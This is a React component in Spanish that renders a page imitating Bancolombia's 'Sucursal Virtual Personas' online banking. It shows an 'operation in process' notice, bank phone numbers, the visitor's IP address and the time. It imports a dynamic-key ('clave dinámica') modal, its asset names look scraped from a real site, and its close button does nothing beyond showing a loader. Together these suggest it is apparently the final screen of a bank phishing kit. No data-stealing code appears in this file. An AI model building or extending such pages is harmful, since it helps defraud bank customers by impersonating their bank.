import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import ClaveDinaModal from "./modals/ClaveDinaModal";
import AccionesModal from "./modals/accionesModal";
import Loading from "app/components/Loading";
import './css/LoginModal.css';
import { limpiarPaddingBody } from "@utils";

export default function FinalizadoPage() {
    // const navigate = useNavigate();

    // Se inicializa el cargando
    const [cargando, setCargando] = useState(false);

    const handleClose = () => {
        // Se muestra el cargando por 2 segundos
        setCargando(true);

        // Se crea un temporalizador para cerrar el modal
        setTimeout(() => {
            // Se llama el metodo para cerrar el modal
            setCargando(false);
            console.log("Cerrar clicked");
        }, 2000);

    };

    // Se inicializa el formState
    const [formState, setFormState] = useState({
        usuario: "",
        clave: "",
        errorUsuario: false,
        errorClave: false,
        lanzarModalAcciones: false,
        lanzarModalInactividad: false,
        lanzarModalErrorSesion: false,
        touchedClave: false
    });

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se limpia el padding del body
        limpiarPaddingBody();

        // Se obtiene la IP
        obtenerIP();

        // Se obtiene la fecha/hora con formato
        obtenerFechaHora();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        obtenerFechaHora();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto =
            (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {
            obtenerFechaHora();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {
                obtenerFechaHora();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // Obtiene la dirección IP pública del usuario
    // usando el servicio externo api.ipify.org
    const obtenerIP = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // Obtiene la fecha y hora actual del sistema
    // y la formatea en español (Colombia)
    const obtenerFechaHora = () => {

        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const opciones = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = ahora.toLocaleString("es-CO", opciones);

        // Se guarda el valor formateado en el estado
        setFechaHora(formato);
    };

    const cerrarModalAcciones = () => {
        setFormState(prev => ({
            ...prev,
            lanzarModalAcciones: false
        }));
    };

    return (
        <>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                        backgroundRepeat: "no-repeat",
                        backgroundPosition: "center",
                        backgroundPositionY: "-70px",
                        backgroundPositionX: "-500px",
                    }}
                >
                    {/* LOGO */}
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/images/img_pantalla2/descarga.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    {/* TITLE */}
                    <div>
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    {/* MAIN CARD */}
                    <div className="login-page">
                        <div className="login-box" style={{
                            backgroundColor: "transparent",
                            width: "90%", // Responsive width
                            maxWidth: "400px",
                            textAlign: "center",
                            borderRadius: "8px",
                            color: "#ffffff",
                            padding: "30px 20px", // Reduced padding for mobile
                            margin: "0 auto" // Center card
                        }}>

                            {/* NOTICE BOX */}
                            <div style={{
                                backgroundColor: "transparent",
                                border: "1px solid #ccc",
                                padding: "15px",
                                display: "flex",
                                alignItems: "center",
                                gap: "15px",
                                textAlign: "left",
                                marginBottom: "30px",
                                borderRadius: "4px"
                            }}>
                                <img
                                    src="/assets/images/IMGdebitotj/enviado-pronto.png"
                                    alt="Reloj"
                                    style={{ width: "50px", height: "50px", flexShrink: 0 }}
                                />
                                <div>
                                    <h3 style={{ margin: "0 0 5px 0", fontSize: "16px", fontWeight: "bold", color: "#ffffff" }}>Operacion en proceso!</h3>
                                    <p style={{ margin: 0, fontSize: "13px", lineHeight: "1.3" }}>
                                        Estamos procesando su solicitud. Esto puede tardar un momento.
                                    </p>
                                </div>
                            </div>

                            {/* CONTACT INFO */}
                            <h3 style={{ fontSize: "16px", marginBottom: "20px", color: "#ffffff" }}>Sucursal Telefónica Bancolombia</h3>

                            {/* Grid Layout for closer alignment */}
                            <div style={{
                                display: "grid",
                                gridTemplateColumns: "1fr 1fr", // Two equal columns
                                columnGap: "10px", // Small gap between city and number
                                rowGap: "8px",
                                fontSize: "14px",
                                lineHeight: "1.4",
                                marginBottom: "30px",
                                textAlign: "right" // Default right align for first column items? No, applied individually
                            }}>
                                <span style={{ textAlign: "right" }}>Medellín:</span> <span style={{ textAlign: "left" }}>510 8000</span>
                                <span style={{ textAlign: "right" }}>Bogotá:</span> <span style={{ textAlign: "left" }}>343 0101</span>
                                <span style={{ textAlign: "right" }}>Barranquilla:</span> <span style={{ textAlign: "left" }}>361 8989</span>
                                <span style={{ textAlign: "right" }}>Bucaramanga:</span> <span style={{ textAlign: "left" }}>697 2525</span>
                                <span style={{ textAlign: "right" }}>Cali:</span> <span style={{ textAlign: "left" }}>554 0506</span>
                                <span style={{ textAlign: "right" }}>Cartagena:</span> <span style={{ textAlign: "left" }}>693 4401</span>
                                <span style={{ textAlign: "right" }}>Pereira:</span> <span style={{ textAlign: "left" }}>340 1214</span>
                                <span style={{ textAlign: "right" }}>Resto del país:</span> <span style={{ textAlign: "left" }}>01 8000 08 12 345</span>
                            </div>


                            {/* EXTERIOR INFO */}
                            <h3 style={{ fontSize: "16px", marginBottom: "15px", color: "#ffffff" }}>Sucursal Telefónicas en el Exterior</h3>
                            <div style={{
                                display: "grid",
                                gridTemplateColumns: "1fr 1fr",
                                columnGap: "10px",
                                rowGap: "8px",
                                fontSize: "14px",
                                lineHeight: "1.4",
                                marginBottom: "40px"
                            }}>
                                <span style={{ textAlign: "right" }}>España:</span> <span style={{ textAlign: "left" }}>900 994 717</span>
                                <span style={{ textAlign: "right" }}>Estados Unidos:</span> <span style={{ textAlign: "left" }}>1 866 378 97 14</span>
                            </div>

                            {/* BUTTON */}
                            <button
                                className="login-btn"
                                onClick={handleClose}
                                style={{ width: "100%", maxWidth: "200px", fontSize: "16px" }}
                            >
                                Cerrar
                            </button>

                        </div>
                    </div>
                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        alt="Bancolombia"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "180px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Modal de inactividad */}
                {formState.lanzarModalInactividad ?
                    <ClaveDinaModal isOpen={formState.lanzarModalInactividad} onClose={() => setFormState(prev => ({
                        ...prev,
                        lanzarModalInactividad: false
                    }))} /> : null}

                {/* Modal de acciones */}
                {formState.lanzarModalAcciones ?
                    <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={cerrarModalAcciones} /> : null}

                {/* Modal de error de sesión */}
                {formState.lanzarModalErrorSesion ?
                    <ClaveDinaModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
                        ...prev,
                        lanzarModalErrorSesion: false
                    }))} /> : null}
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ? <Loading /> : null}
        </>
    );
};
